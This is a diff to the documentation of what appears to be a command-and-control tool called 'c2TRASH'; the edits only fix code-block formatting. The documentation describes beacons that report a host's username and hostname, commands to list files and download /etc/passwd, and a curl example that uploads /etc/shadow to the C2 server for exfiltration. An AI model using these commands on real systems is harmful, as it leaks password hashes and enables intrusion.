@@ -7,7 +7,9 @@ HTTPS with JSON payloads
 
 ### Beacons
 
-Something like (example writen in python) ```
+Something like (example writen in python)
+
+```
 {
         "usr":getpass.getuser(),
         "hostname":socket.gethostname(),
@@ -19,12 +21,17 @@ Something like (example writen in python) ```
 
 ### Command Payloads
 
-Something like ```
+Something like
+
+```
 {
     "ls":"-al"
 }
+
 ```
+
 or 
+```
 {
     "download":"/etc/passwd"
 }
@@ -41,6 +48,7 @@ Files stored in `<install-dir>/static` can be downloaded from https://<ip>:<port
 File uploads are accepted to aid in exfiltration. This is used by the `download` c2TRASH command, but can be invoked directly:
 
 Example:
+
 ```
 curl -k -F '/etc/shadow=@/etc/shadow' https://<c2TRASH>/upload.php
 ```
